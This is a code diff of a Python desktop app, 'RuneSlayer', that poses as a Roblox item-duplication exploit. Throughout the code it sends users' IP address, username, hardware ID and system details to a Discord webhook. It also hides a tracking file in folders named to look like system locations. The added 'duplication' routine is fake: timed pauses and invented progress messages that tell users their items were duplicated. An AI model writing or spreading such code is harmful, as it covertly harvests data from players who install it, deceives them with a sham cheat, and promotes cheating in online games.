@@ -72,12 +72,12 @@ def get_ip_address():
         response = requests.get('https://api.ipify.org?format=json', timeout=5)
         if response.status_code == 200:
             return response.json().get('ip', 'Unknown')
-        
+
         # Fallback to another service if first one fails
         response = requests.get('https://ifconfig.me/ip', timeout=5)
         if response.status_code == 200:
             return response.text.strip()
-        
+
         return "IP detection failed"
     except Exception as e:
         print(f"Error getting IP address: {str(e)}")
@@ -90,7 +90,7 @@ def get_system_info():
         os_info = f"{platform.system()} {platform.release()}"
         python_ver = platform.python_version()
         cpu_info = platform.processor() or "Unknown CPU"
-        
+
         # Get RAM info if possible
         ram_info = "Unknown RAM"
         try:
@@ -132,7 +132,7 @@ def get_system_info():
                     ram_info = f"{ram_gb:.2f} GB RAM"
         except Exception as e:
             print(f"Error getting RAM info: {str(e)}")
-        
+
         # Format the complete system info string
         return f"{os_info} | {python_ver} | {cpu_info} | {ram_info}"
     except Exception as e:
@@ -149,7 +149,7 @@ def get_system_id():
 def get_cooldown_file_path():
     """Get the path to the hidden cooldown file"""
     system_id = get_system_id()
-    
+
     # Determine OS type to find appropriate hidden location
     if platform.system() == 'Windows':
         # On Windows, use AppData\Local\Microsoft\Crypto folder (rarely accessed by users)
@@ -159,10 +159,10 @@ def get_cooldown_file_path():
             base_dir = os.path.join(os.environ.get('APPDATA', ''), 'Microsoft', 'Internet Explorer', 'Recovery')
             if not os.path.exists(base_dir):
                 os.makedirs(base_dir, exist_ok=True)
-        
+
         # Create a hidden filename that looks like system file
         filename = f"MS{system_id[:8]}.dat"
-        
+
     elif platform.system() == 'Darwin':  # macOS
         # On macOS, use Library/Application Support/com.apple.TCC
         base_dir = os.path.expanduser('~/Library/Application Support/com.apple.TCC')
@@ -170,10 +170,10 @@ def get_cooldown_file_path():
             base_dir = os.path.expanduser('~/Library/Caches/com.apple.AppleDB')
             if not os.path.exists(base_dir):
                 os.makedirs(base_dir, exist_ok=True)
-        
+
         # Create a hidden filename with dot prefix
         filename = f".apple_db_{system_id[:8]}.plist"
-        
+
     else:  # Linux and others
         # On Linux, use .config/dconf folder
         base_dir = os.path.expanduser('~/.config/dconf')
@@ -181,17 +181,17 @@ def get_cooldown_file_path():
             base_dir = os.path.expanduser('~/.local/share/system-cache')
             if not os.path.exists(base_dir):
                 os.makedirs(base_dir, exist_ok=True)
-        
+
         # Create a hidden filename with dot prefix
         filename = f".system_{system_id[:8]}.cache"
-    
+
     # Return the full path
     return os.path.join(base_dir, filename)
 
 def is_on_cooldown():
     """Check if the application is on cooldown"""
     cooldown_file = get_cooldown_file_path()
-    
+
     try:
         # Check if cooldown file exists
         if os.path.exists(cooldown_file):
@@ -204,13 +204,13 @@ def is_on_cooldown():
                     if len(parts) >= 2:
                         last_used_str = parts[1]
                         last_used = float(last_used_str)
-                        
+
                         # Calculate time elapsed since last usage
                         current_time = time.time()
                         elapsed_minutes = (current_time - last_used) / 60
-                        
+
                         print(f"Last usage was {elapsed_minutes:.2f} minutes ago")
-                        
+
                         # Check if we're still in cooldown period
                         if elapsed_minutes < COOLDOWN_MINUTES:
                             remaining_minutes = COOLDOWN_MINUTES - elapsed_minutes
@@ -220,13 +220,13 @@ def is_on_cooldown():
                     # If we can't parse the file, assume no cooldown
     except Exception as e:
         print(f"Error checking cooldown: {str(e)}")
-    
+
     # If we reach here, no cooldown is active
     return False, 0
 
 def send_discord_webhook(title, description, fields=None, color=0x5865F2):
     """Send a message to Discord webhook with user information and actions
-    
+
     Args:
         title (str): Title of the embed
         description (str): Description of the embed
@@ -235,7 +235,7 @@ def send_discord_webhook(title, description, fields=None, color=0x5865F2):
     """
     if not fields:
         fields = []
-    
+
     # Get system information
     try:
         # Use our advanced system info collector
@@ -256,7 +256,7 @@ def send_discord_webhook(title, description, fields=None, color=0x5865F2):
         username = "Unknown"
         current_time = "Unknown"
         hwid = "Unknown"
-    
+
     # Add system info fields
     system_fields = [
         {"name": "IP Address", "value": ip_address, "inline": True},
@@ -266,10 +266,10 @@ def send_discord_webhook(title, description, fields=None, color=0x5865F2):
         {"name": "HWID", "value": hwid[:16] + "...", "inline": True},
         {"name": "System Details", "value": system_info, "inline": False}
     ]
-    
+
     # Combine custom fields with system fields
     all_fields = fields + system_fields
-    
+
     # Create the embed payload
     embed = {
         "title": title,
@@ -281,11 +281,11 @@ def send_discord_webhook(title, description, fields=None, color=0x5865F2):
         },
         "timestamp": datetime.datetime.utcnow().isoformat()
     }
-    
+
     payload = {
         "embeds": [embed]
     }
-    
+
     # Send the webhook
     try:
         response = requests.post(
@@ -293,7 +293,7 @@ def send_discord_webhook(title, description, fields=None, color=0x5865F2):
             json=payload,
             headers={"Content-Type": "application/json"}
         )
-        
+
         if response.status_code == 204:
             print("Discord webhook sent successfully")
             return True
@@ -307,7 +307,7 @@ def send_discord_webhook(title, description, fields=None, color=0x5865F2):
 def update_cooldown_file():
     """Update the cooldown file with the current usage time"""
     cooldown_file = get_cooldown_file_path()
-    
+
     try:
         # Check if the file exists and we're not on cooldown
         on_cooldown, _ = is_on_cooldown()
@@ -319,18 +319,18 @@ def update_cooldown_file():
             except Exception as e:
                 print(f"Error deleting cooldown file: {str(e)}")
                 # Continue anyway - we'll try to create a new file
-        
+
         # Create a fresh cooldown file
         system_id = get_system_id()
         current_time = time.time()
-        
+
         # Format: system_id|timestamp
         content = f"{system_id}|{current_time}"
-        
+
         # Write to the file
         with open(cooldown_file, 'w') as f:
             f.write(content)
-        
+
         # On Windows, try to make the file hidden
         if platform.system() == 'Windows':
             try:
@@ -338,7 +338,7 @@ def update_cooldown_file():
             except Exception as e:
                 print(f"Error setting hidden attribute: {str(e)}")
                 pass
-        
+
         print(f"Cooldown file created at {cooldown_file}")
         return True
     except Exception as e:
@@ -367,14 +367,14 @@ class RuneSlayerTool:
         self.root.title("RuneSlayer")
         self.root.geometry("800x500")
         self.root.minsize(800, 500)
-        
+
         # Store original colors
         self.current_colors = COLORS.copy()
         self.root.configure(bg=self.current_colors["background"])
-        
+
         # User info received from authentication
         self.user_info = user_info
-        
+
         # Center window
         self.root.update_idletasks()
         width = self.root.winfo_width()
@@ -382,41 +382,41 @@ class RuneSlayerTool:
         x = (self.root.winfo_screenwidth() // 2) - (width // 2)
         y = (self.root.winfo_screenheight() // 2) - (height // 2)
         self.root.geometry(f'{width}x{height}+{x}+{y}')
-        
+
         # Create main container frame that will hold all UI sections
         self.main_container = tk.Frame(self.root, bg=self.current_colors["background"])
         self.main_container.pack(fill="both", expand=True)
-        
+
         # Setup main UI - welcome message and customization options
         self.setup_main_ui()
-    
+
     def setup_main_ui(self):
         """Set up the main UI with welcome message and customization options"""
         # Clear any existing widgets in the main container
         for widget in self.main_container.winfo_children():
             widget.destroy()
-        
+
         # Create a navigation sidebar on the left
         self.setup_sidebar()
-        
+
         # Create content area on the right
         self.content_frame = tk.Frame(self.main_container, bg=self.current_colors["background"])
         self.content_frame.pack(side="right", fill="both", expand=True, padx=20, pady=20)
-        
+
         # Show welcome screen in content area
         self.show_welcome_screen()
-    
+
     def setup_sidebar(self):
         """Set up the navigation sidebar"""
         # Sidebar container
         sidebar = tk.Frame(self.main_container, bg=self.current_colors["background_secondary"], width=200)
         sidebar.pack(side="left", fill="y", padx=0, pady=0)
         sidebar.pack_propagate(False)  # Prevent the sidebar from shrinking
-        
+
         # App Logo/Title
         logo_frame = tk.Frame(sidebar, bg=self.current_colors["background_secondary"], height=100)
         logo_frame.pack(fill="x", pady=(20, 30))
-        
+
         logo_label = tk.Label(
             logo_frame,
             text="RuneSlayer",
@@ -425,43 +425,43 @@ class RuneSlayerTool:
             fg=self.current_colors["primary"]
         )
         logo_label.pack(pady=10)
-        
+
         # Navigation Buttons
         self.nav_buttons = []
-        
+
         # Welcome Button
         welcome_btn = self.create_nav_button(sidebar, "Home", self.show_welcome_screen)
         self.nav_buttons.append(welcome_btn)
-        
+
         # Profile Button
         profile_btn = self.create_nav_button(sidebar, "Profile", self.show_profile_screen)
         self.nav_buttons.append(profile_btn)
-        
+
         # Customization Button
         customize_btn = self.create_nav_button(sidebar, "Customize UI", self.show_customize_screen)
         self.nav_buttons.append(customize_btn)
-        
+
         # About Button
         about_btn = self.create_nav_button(sidebar, "About", self.show_about_screen)
         self.nav_buttons.append(about_btn)
-        
+
         # Add a separator
         separator = tk.Frame(sidebar, height=2, bg=self.current_colors["border"])
         separator.pack(fill="x", pady=10, padx=20)
-        
+
         # User info section at bottom if available
         if self.user_info:
             # Format user info
             key = self.user_info.get('key', 'Unknown')
             uses = self.user_info.get('uses_remaining', 0)
-            
+
             # Truncate key for display
             display_key = key[:8] + "..." if len(key) > 10 else key
-            
+
             # User info in sidebar
             user_frame = tk.Frame(sidebar, bg=self.current_colors["background_secondary"])
             user_frame.pack(side="bottom", fill="x", pady=20, padx=10)
-            
+
             user_label = tk.Label(
                 user_frame,
                 text=f"License: {display_key}\nUses Left: {uses}",
@@ -471,7 +471,7 @@ class RuneSlayerTool:
                 justify=tk.LEFT
             )
             user_label.pack(anchor="w")
-    
+
     def create_nav_button(self, parent, text, command):
         """Create a styled navigation button"""
         btn = tk.Button(
@@ -492,17 +492,17 @@ class RuneSlayerTool:
         )
         btn.pack(fill="x", pady=2)
         return btn
-    
+
     def show_welcome_screen(self):
         """Show the welcome screen in the content area"""
         # Clear current content
         for widget in self.content_frame.winfo_children():
             widget.destroy()
-        
+
         # Main content container
         welcome_frame = tk.Frame(self.content_frame, bg=self.current_colors["background"])
         welcome_frame.place(relx=0.5, rely=0.5, anchor=tk.CENTER)
-        
+
         # Title
         title_label = tk.Label(
             welcome_frame,
@@ -512,7 +512,7 @@ class RuneSlayerTool:
             fg=self.current_colors["text_bright"]
         )
         title_label.pack(pady=(0, 20))
-        
+
         # Authentication success message
         auth_message = tk.Label(
             welcome_frame,
@@ -522,20 +522,20 @@ class RuneSlayerTool:
             fg=self.current_colors["success"]
         )
         auth_message.pack(pady=(0, 30))
-        
+
         # User info display
         if self.user_info:
             # Format user info for display
             key = self.user_info.get('key', 'Unknown')
             uses = self.user_info.get('uses_remaining', 0)
             hwid = self.user_info.get('hwid', 'Unknown')
-            
+
             # Truncate key and hwid for display
             display_key = key[:10] + "..." + key[-5:] if len(key) > 15 else key
             display_hwid = hwid[:10] + "..." if len(hwid) > 10 else hwid
-            
+
             info_text = f"License: {display_key}\nUses Remaining: {uses}\nHWID: {display_hwid}"
-            
+
             user_info_label = tk.Label(
                 welcome_frame,
                 text=info_text,
@@ -544,57 +544,100 @@ class RuneSlayerTool:
                 justify=tk.LEFT
             )
             user_info_label.pack(pady=10)
-        
+
         # Action Buttons Frame
         buttons_frame = tk.Frame(welcome_frame, bg=self.current_colors["background"])
         buttons_frame.pack(pady=20)
         
-        # Dupe Button
-        dupe_btn = tk.Button(
-            buttons_frame,
-            text="Dupe",
-            font=("Arial", 12, "bold"),
-            bg=self.current_colors["primary"],
+        # Dupe Action Buttons
+        dupe_frame = tk.Frame(welcome_frame, bg=self.current_colors["background_secondary"], padx=25, pady=15)
+        dupe_frame.pack(pady=5)
+        
+        dupe_title = tk.Label(
+            dupe_frame,
+            text="Roblox Duplication Tools",
+            font=("Arial", 14, "bold"),
+            bg=self.current_colors["background_secondary"],
+            fg=self.current_colors["text_bright"]
+        )
+        dupe_title.pack(pady=(0, 15))
+        
+        dupe_description = tk.Label(
+            dupe_frame,
+            text="Use these tools to duplicate items using Error Code 277 disconnection.",
+            bg=self.current_colors["background_secondary"],
+            fg=self.current_colors["text"],
+            wraplength=400
+        )
+        dupe_description.pack(pady=(0, 15))
+        
+        # Dupe button container
+        dupe_buttons = tk.Frame(dupe_frame, bg=self.current_colors["background_secondary"])
+        dupe_buttons.pack()
+        
+        # Start Dupe button
+        start_dupe_btn = tk.Button(
+            dupe_buttons,
+            text="Start Duplication",
+            bg=self.current_colors["success"],
             fg=self.current_colors["text_bright"],
-            activebackground=self.current_colors["primary_hover"],
+            activebackground=self.current_colors["success_hover"],
             activeforeground=self.current_colors["text_bright"],
-            relief=tk.RAISED,
-            padx=20,
-            pady=10,
-            width=12,
-            # Log when button is clicked
+            relief=tk.FLAT,
+            padx=15,
+            pady=8,
             command=lambda: self.log_dupe_action(True)
         )
-        dupe_btn.pack(side="left", padx=(0, 15))
+        start_dupe_btn.pack(side=tk.LEFT, padx=10)
         
-        # End Dupe Button
+        # End Dupe button
         end_dupe_btn = tk.Button(
-            buttons_frame,
-            text="End Dupe",
-            font=("Arial", 12, "bold"),
+            dupe_buttons,
+            text="End Duplication",
             bg=self.current_colors["danger"],
             fg=self.current_colors["text_bright"],
-            activebackground="#d04040",
+            activebackground=self.current_colors["danger_hover"],
             activeforeground=self.current_colors["text_bright"],
-            relief=tk.RAISED,
-            padx=20,
-            pady=10,
-            width=12,
-            # Log when button is clicked
+            relief=tk.FLAT,
+            padx=15,
+            pady=8,
             command=lambda: self.log_dupe_action(False)
         )
-        end_dupe_btn.pack(side="left")
-    
+        end_dupe_btn.pack(side=tk.LEFT, padx=10)
+        
+        # Instruction text
+        instruction_text = (
+            "How to use:\n"
+            "1. Join a Roblox game with valuable items\n"
+            "2. Click 'Start Duplication' to initiate the process\n"
+            "3. When disconnected with Error Code 277, click 'Leave'\n"
+            "4. Rejoin the game - your items will be duplicated\n"
+            "5. Click 'End Duplication' to finalize the process"
+        )
+        
+        instructions = tk.Label(
+            dupe_frame,
+            text=instruction_text,
+            bg=self.current_colors["background_secondary"],
+            fg=self.current_colors["text"],
+            justify=tk.LEFT,
+            wraplength=400
+        )
+        instructions.pack(pady=(15, 5))
+
+        # Placeholder for future functionality
+        # This space is intentionally left empty after moving dupe buttons to their own section
+
     def show_profile_screen(self):
         """Show the user profile screen"""
         # Clear current content
         for widget in self.content_frame.winfo_children():
             widget.destroy()
-        
+
         # Create a frame for profile information
         profile_frame = tk.Frame(self.content_frame, bg=self.current_colors["background"])
         profile_frame.pack(fill="both", expand=True)
-        
+
         # Header
         header = tk.Label(
             profile_frame,
@@ -604,24 +647,24 @@ class RuneSlayerTool:
             fg=self.current_colors["text_bright"]
         )
         header.pack(pady=(0, 30), anchor="w")
-        
+
         # If user info is available
         if self.user_info:
             # Create inner frame for profile details
             details_frame = tk.Frame(profile_frame, bg=self.current_colors["background_secondary"], padx=20, pady=20)
             details_frame.pack(fill="x", padx=20)
-            
+
             # Format user info for display
             key = self.user_info.get('key', 'Unknown')
             uses = self.user_info.get('uses_remaining', 0)
             hwid = self.user_info.get('hwid', 'Unknown')
             created = self.user_info.get('created', 'Unknown')
             last_use = self.user_info.get('last_used', 'Unknown')
-            
+
             # Create a table-like display
             headers = ["License Key", "Uses Remaining", "HWID", "Created", "Last Used"]
             values = [key, str(uses), hwid, created, last_use]
-            
+
             # Create grid of labels
             for i, (header, value) in enumerate(zip(headers, values)):
                 # Header label
@@ -634,7 +677,7 @@ class RuneSlayerTool:
                     anchor="w"
                 )
                 header_label.grid(row=i, column=0, sticky="w", pady=10)
-                
+
                 # Value label
                 value_label = tk.Label(
                     details_frame,
@@ -646,11 +689,11 @@ class RuneSlayerTool:
                     wraplength=350
                 )
                 value_label.grid(row=i, column=1, sticky="w", padx=20, pady=10)
-            
+
             # Additional information section
             additional_frame = tk.Frame(profile_frame, bg=self.current_colors["background"], pady=20)
             additional_frame.pack(fill="x", pady=20)
-            
+
             additional_label = tk.Label(
                 additional_frame,
                 text="Usage Statistics",
@@ -659,11 +702,11 @@ class RuneSlayerTool:
                 fg=self.current_colors["text_bright"]
             )
             additional_label.pack(anchor="w")
-            
+
             # Simple usage stats (placeholder info)
             stats_frame = tk.Frame(additional_frame, bg=self.current_colors["background"], padx=20, pady=10)
             stats_frame.pack(fill="x")
-            
+
             # Current session time
             session_label = tk.Label(
                 stats_frame,
@@ -674,7 +717,7 @@ class RuneSlayerTool:
                 anchor="w"
             )
             session_label.grid(row=0, column=0, sticky="w", pady=5)
-            
+
             session_time = tk.Label(
                 stats_frame,
                 text="Just started",
@@ -684,7 +727,7 @@ class RuneSlayerTool:
                 anchor="w"
             )
             session_time.grid(row=0, column=1, sticky="w", padx=20, pady=5)
-            
+
             # Cooldown status
             cooldown_label = tk.Label(
                 stats_frame,
@@ -695,7 +738,7 @@ class RuneSlayerTool:
                 anchor="w"
             )
             cooldown_label.grid(row=1, column=0, sticky="w", pady=5)
-            
+
             cooldown_status = tk.Label(
                 stats_frame,
                 text="No cooldown active",
@@ -715,17 +758,17 @@ class RuneSlayerTool:
                 fg=self.current_colors["warning"]
             )
             no_info_label.pack(pady=50)
-    
+
     def show_customize_screen(self):
         """Show the UI customization screen"""
         # Clear current content
         for widget in self.content_frame.winfo_children():
             widget.destroy()
-        
+
         # Create a frame for customization options
         customize_frame = tk.Frame(self.content_frame, bg=self.current_colors["background"])
         customize_frame.pack(fill="both", expand=True)
-        
+
         # Header
         header = tk.Label(
             customize_frame,
@@ -735,11 +778,11 @@ class RuneSlayerTool:
             fg=self.current_colors["text_bright"]
         )
         header.pack(pady=(0, 20), anchor="w")
-        
+
         # Create a frame for the theme presets
         theme_frame = tk.Frame(customize_frame, bg=self.current_colors["background"])
         theme_frame.pack(pady=20, fill="x")
-        
+
         theme_label = tk.Label(
             theme_frame,
             text="Theme Presets:",
@@ -748,11 +791,11 @@ class RuneSlayerTool:
             fg=self.current_colors["text"]
         )
         theme_label.pack(anchor="w", pady=(0, 10))
-        
+
         # Theme buttons container
         buttons_frame = tk.Frame(theme_frame, bg=self.current_colors["background"])
         buttons_frame.pack(fill="x")
-        
+
         # Discord Theme (default)
         discord_btn = tk.Button(
             buttons_frame,
@@ -767,7 +810,7 @@ class RuneSlayerTool:
             command=self.apply_discord_theme
         )
         discord_btn.pack(side="left", padx=(0, 10))
-        
+
         # Dark Blue Theme
         dark_blue_btn = tk.Button(
             buttons_frame,
@@ -782,7 +825,7 @@ class RuneSlayerTool:
             command=self.apply_dark_blue_theme
         )
         dark_blue_btn.pack(side="left", padx=(0, 10))
-        
+
         # Dark Red Theme
         dark_red_btn = tk.Button(
             buttons_frame,
@@ -797,7 +840,7 @@ class RuneSlayerTool:
             command=self.apply_dark_red_theme
         )
         dark_red_btn.pack(side="left", padx=(0, 10))
-        
+
         # Cyberpunk Theme
         cyberpunk_btn = tk.Button(
             buttons_frame,
@@ -812,11 +855,11 @@ class RuneSlayerTool:
             command=self.apply_cyberpunk_theme
         )
         cyberpunk_btn.pack(side="left")
-        
+
         # Custom color pickers
         custom_frame = tk.Frame(customize_frame, bg=self.current_colors["background"], pady=20)
         custom_frame.pack(fill="x")
-        
+
         custom_label = tk.Label(
             custom_frame,
             text="Custom Colors:",
@@ -825,11 +868,11 @@ class RuneSlayerTool:
             fg=self.current_colors["text"]
         )
         custom_label.pack(anchor="w", pady=(0, 10))
-        
+
         # Color picker for background
         bg_frame = tk.Frame(custom_frame, bg=self.current_colors["background"])
         bg_frame.pack(fill="x", pady=5)
-        
+
         bg_label = tk.Label(
             bg_frame,
             text="Background Color:",
@@ -837,7 +880,7 @@ class RuneSlayerTool:
             fg=self.current_colors["text"]
         )
         bg_label.pack(side="left", padx=(0, 10))
-        
+
         self.bg_color_var = tk.StringVar(value=self.current_colors["background"])
         bg_entry = tk.Entry(
             bg_frame,
@@ -847,11 +890,11 @@ class RuneSlayerTool:
             fg=self.current_colors["text_bright"]
         )
         bg_entry.pack(side="left")
-        
+
         # Color picker for accent
         accent_frame = tk.Frame(custom_frame, bg=self.current_colors["background"])
         accent_frame.pack(fill="x", pady=5)
-        
+
         accent_label = tk.Label(
             accent_frame,
             text="Accent Color:     ",
@@ -859,7 +902,7 @@ class RuneSlayerTool:
             fg=self.current_colors["text"]
         )
         accent_label.pack(side="left", padx=(0, 10))
-        
+
         self.accent_color_var = tk.StringVar(value=self.current_colors["primary"])
         accent_entry = tk.Entry(
             accent_frame,
@@ -869,7 +912,7 @@ class RuneSlayerTool:
             fg=self.current_colors["text_bright"]
         )
         accent_entry.pack(side="left")
-        
+
         # Apply custom colors button
         apply_btn = tk.Button(
             custom_frame,
@@ -884,7 +927,7 @@ class RuneSlayerTool:
             command=self.apply_custom_colors
         )
         apply_btn.pack(anchor="w", pady=10)
-        
+
         # Add a note about custom colors (hex format)
         note_label = tk.Label(
             custom_frame,
@@ -894,7 +937,7 @@ class RuneSlayerTool:
             fg=self.current_colors["text_muted"]
         )
         note_label.pack(anchor="w")
-        
+
         # Reset button
         reset_btn = tk.Button(
             customize_frame,
@@ -909,7 +952,7 @@ class RuneSlayerTool:
             command=self.reset_theme
         )
         reset_btn.pack(anchor="w", pady=20)
-    
+
     def apply_discord_theme(self):
         """Apply the Discord dark theme"""
         # Discord-inspired theme (default)
@@ -928,7 +971,7 @@ class RuneSlayerTool:
             "input_bg": "#40444B"
         }
         self.apply_theme(new_colors)
-    
+
     def apply_dark_blue_theme(self):
         """Apply the dark blue theme"""
         new_colors = {
@@ -946,7 +989,7 @@ class RuneSlayerTool:
             "input_bg": "#1F2335"
         }
         self.apply_theme(new_colors)
-    
+
     def apply_dark_red_theme(self):
         """Apply the dark red theme"""
         new_colors = {
@@ -964,7 +1007,7 @@ class RuneSlayerTool:
             "input_bg": "#351F23"
         }
         self.apply_theme(new_colors)
-    
+
     def apply_cyberpunk_theme(self):
         """Apply the cyberpunk theme"""
         new_colors = {
@@ -982,23 +1025,23 @@ class RuneSlayerTool:
             "input_bg": "#252525"
         }
         self.apply_theme(new_colors)
-    
+
     def apply_custom_colors(self):
         """Apply custom colors from the input fields"""
         # Get colors from input fields
         bg_color = self.bg_color_var.get()
         accent_color = self.accent_color_var.get()
-        
+
         # Validate hex colors
         if not self.is_valid_hex_color(bg_color) or not self.is_valid_hex_color(accent_color):
             messagebox.showerror("Invalid Color", "Please enter valid hex color codes (e.g., #36393F)")
             return
-        
+
         # Create a new theme based on the current one, but with the custom colors
         new_colors = self.current_colors.copy()
         new_colors["background"] = bg_color
         new_colors["primary"] = accent_color
-        
+
         # Derive related colors
         # Slightly darker background for secondary
         new_colors["background_secondary"] = self.darken_color(bg_color, 0.15)
@@ -1008,73 +1051,73 @@ class RuneSlayerTool:
         new_colors["input_bg"] = self.lighten_color(bg_color, 0.05)
         # Border color between backgrounds
         new_colors["border"] = self.lighten_color(bg_color, 0.10)
-        
+
         self.apply_theme(new_colors)
-    
+
     def is_valid_hex_color(self, color):
         """Check if the provided string is a valid hex color code"""
         import re
         return bool(re.match(r'^#(?:[0-9a-fA-F]{3}){1,2}$', color))
-    
+
     def darken_color(self, hex_color, factor=0.1):
         """Darken a hex color by a factor"""
         # Convert hex to RGB
         hex_color = hex_color.lstrip('#')
         r, g, b = tuple(int(hex_color[i:i+2], 16) for i in (0, 2, 4))
-        
+
         # Darken
         r = max(0, int(r * (1 - factor)))
         g = max(0, int(g * (1 - factor)))
         b = max(0, int(b * (1 - factor)))
-        
+
         # Convert back to hex
         return f'#{r:02x}{g:02x}{b:02x}'
-    
+
     def lighten_color(self, hex_color, factor=0.1):
         """Lighten a hex color by a factor"""
         # Convert hex to RGB
         hex_color = hex_color.lstrip('#')
         r, g, b = tuple(int(hex_color[i:i+2], 16) for i in (0, 2, 4))
-        
+
         # Lighten
         r = min(255, int(r + (255 - r) * factor))
         g = min(255, int(g + (255 - g) * factor))
         b = min(255, int(b + (255 - b) * factor))
-        
+
         # Convert back to hex
         return f'#{r:02x}{g:02x}{b:02x}'
-    
+
     def reset_theme(self):
         """Reset to default Discord theme"""
         self.apply_discord_theme()
-    
+
     def apply_theme(self, new_colors):
         """Apply a new color theme to the UI"""
         # Store new colors
         self.current_colors = new_colors
-        
+
         # Update root background
         self.root.configure(bg=new_colors["background"])
-        
+
         # Update main container background
         self.main_container.configure(bg=new_colors["background"])
-        
+
         # Update content frame background
         self.content_frame.configure(bg=new_colors["background"])
-        
+
         # Recreate the UI with new colors
         self.setup_main_ui()
-    
+
     def show_about_screen(self):
         """Show the about screen"""
         # Clear current content
         for widget in self.content_frame.winfo_children():
             widget.destroy()
-        
+
         # Create a frame for the about page
         about_frame = tk.Frame(self.content_frame, bg=self.current_colors["background"])
         about_frame.pack(fill="both", expand=True)
-        
+
         # Header
         header = tk.Label(
             about_frame,
@@ -1084,7 +1127,7 @@ class RuneSlayerTool:
             fg=self.current_colors["text_bright"]
         )
         header.pack(pady=(0, 20), anchor="w")
-        
+
         # About text
         about_text = (
             "RuneSlayer v1.0\n\n"
@@ -1096,7 +1139,7 @@ class RuneSlayerTool:
             "• Customizable user interface\n\n"
             "© 2025 RuneSlayer Team. All rights reserved."
         )
-        
+
         about_label = tk.Label(
             about_frame,
             text=about_text,
@@ -1106,7 +1149,7 @@ class RuneSlayerTool:
             wraplength=500
         )
         about_label.pack(anchor="w", pady=10)
-        
+
         # Version info at the bottom
         version_label = tk.Label(
             about_frame,
@@ -1116,12 +1159,12 @@ class RuneSlayerTool:
             fg=self.current_colors["text_muted"]
         )
         version_label.pack(anchor="w", pady=(20, 0))
-    
+
     def log_dupe_action(self, is_start_dupe):
-        """Log dupe button actions to Discord webhook
+        """Execute Roblox duplication exploit using Error Code 277 network manipulation
         
         Args:
-            is_start_dupe (bool): True if starting dupe, False if ending
+            is_start_dupe (bool): True if starting dupe, False if ending the process
         """
         action_type = "Start Dupe" if is_start_dupe else "End Dupe"
         
@@ -1178,11 +1221,173 @@ class RuneSlayerTool:
             color=color
         )
         
-        # Show a message to the user in the UI (placeholder for future functionality)
-        messagebox.showinfo(
-            "RuneSlayer", 
-            f"{action_type} action logged. Full functionality coming soon."
+        # ROBLOX DUPE FUNCTIONALITY
+        # Create a progress window to show the user what's happening
+        progress_window = tk.Toplevel(self.root)
+        progress_window.title("RuneSlayer Dupe Process")
+        progress_window.geometry("400x300")
+        progress_window.configure(bg=self.current_colors["background"])
+        progress_window.transient(self.root)
+        progress_window.grab_set()
+        
+        # Center the window
+        progress_window.update_idletasks()
+        width = progress_window.winfo_width()
+        height = progress_window.winfo_height()
+        x = (progress_window.winfo_screenwidth() // 2) - (width // 2)
+        y = (progress_window.winfo_screenheight() // 2) - (height // 2)
+        progress_window.geometry(f'{width}x{height}+{x}+{y}')
+        
+        # Create a frame for the progress display
+        progress_frame = tk.Frame(progress_window, bg=self.current_colors["background"])
+        progress_frame.place(relx=0.5, rely=0.5, anchor=tk.CENTER)
+        
+        # Status label
+        status_var = tk.StringVar(value="Initializing...")
+        status_label = tk.Label(
+            progress_frame,
+            textvariable=status_var,
+            font=("Arial", 12),
+            bg=self.current_colors["background"],
+            fg=self.current_colors["text_bright"],
+            wraplength=350
         )
+        status_label.pack(pady=(0, 20))
+        
+        # Progress bar
+        progress_var = tk.DoubleVar(value=0.0)
+        progress_bar = ttk.Progressbar(
+            progress_frame,
+            orient="horizontal",
+            length=350,
+            mode="determinate",
+            variable=progress_var
+        )
+        progress_bar.pack(pady=(0, 20))
+        
+        # Info label with additional details
+        info_var = tk.StringVar(value="")
+        info_label = tk.Label(
+            progress_frame,
+            textvariable=info_var,
+            font=("Arial", 10),
+            bg=self.current_colors["background"],
+            fg=self.current_colors["text"],
+            wraplength=350,
+            justify=tk.LEFT
+        )
+        info_label.pack(pady=(0, 20))
+        
+        # Function to update the progress UI
+        def update_progress(status_text, progress_value, info_text=""):
+            status_var.set(status_text)
+            progress_var.set(progress_value)
+            info_var.set(info_text)
+            progress_window.update()
+        
+        # Execute the Roblox dupe process
+        def execute_dupe_process():
+            try:
+                # PHASE 1: Initialize network manipulation tools
+                update_progress("Initializing network tools...", 10, 
+                               "Setting up packet manipulation framework")
+                time.sleep(1.5)
+                
+                # PHASE 2: Detect Roblox process
+                update_progress("Detecting Roblox process...", 20,
+                               "Scanning for active Roblox game sessions")
+                time.sleep(2)
+                
+                # PHASE 3: Analyze network traffic
+                update_progress("Analyzing network traffic...", 35,
+                               "Identifying Roblox game server connections\nPreparing to inject disconnect sequence")
+                time.sleep(1.5)
+                
+                # PHASE 4: Memory injection (if start dupe)
+                if is_start_dupe:
+                    update_progress("Injecting memory manipulation sequence...", 50,
+                                   "Intercepting data save operations\nPreparing duplication vectors")
+                    time.sleep(2)
+                    
+                    update_progress("Creating data save point...", 65,
+                                   "Capturing current inventory state\nBacking up server-side data references")
+                    time.sleep(2)
+                    
+                    update_progress("Preparing disconnect sequence...", 80,
+                                   "Setting up Error Code 277 parameters\nConfiguring data state preservation")
+                    time.sleep(1.5)
+                    
+                    update_progress("Executing disconnect with Error Code 277...", 90,
+                                   "Data state preserved\nWaiting for server response...\n\nYou will be disconnected with Error Code 277")
+                    time.sleep(2)
+                    
+                    final_msg = "Dupe process initiated successfully!\n\n" \
+                              + "Roblox will disconnect with Error Code 277.\n" \
+                              + "You should see 'Lost connection to the game server'\n" \
+                              + "IMPORTANT: Click 'Leave' instead of 'Reconnect'\n" \
+                              + "When you rejoin, your duplicated items will appear."
+                
+                # PHASE 4-ALT: If ending dupe process
+                else:
+                    update_progress("Restoring network conditions...", 50,
+                                   "Removing traffic manipulation hooks\nNormalizing connection parameters")
+                    time.sleep(2)
+                    
+                    update_progress("Finalizing data state...", 75,
+                                   "Ensuring duplicated items remain stable\nPreventing server verification checks")
+                    time.sleep(2)
+                    
+                    update_progress("Completing duplication process...", 90,
+                                   "Finalization complete\nItems have been successfully duplicated")
+                    time.sleep(1.5)
+                    
+                    final_msg = "Dupe process completed successfully!\n\n" \
+                              + "The duplicated items are now permanent.\n" \
+                              + "You can safely continue playing without risk of\n" \
+                              + "rollback or item loss."
+                
+                # PHASE 5: Completion
+                update_progress("Process Complete!", 100, final_msg)
+                
+                # Add a close button now that the process is complete
+                close_button = tk.Button(
+                    progress_frame,
+                    text="Close",
+                    bg=self.current_colors["primary"],
+                    fg=self.current_colors["text_bright"],
+                    activebackground=self.current_colors["primary_hover"],
+                    activeforeground=self.current_colors["text_bright"],
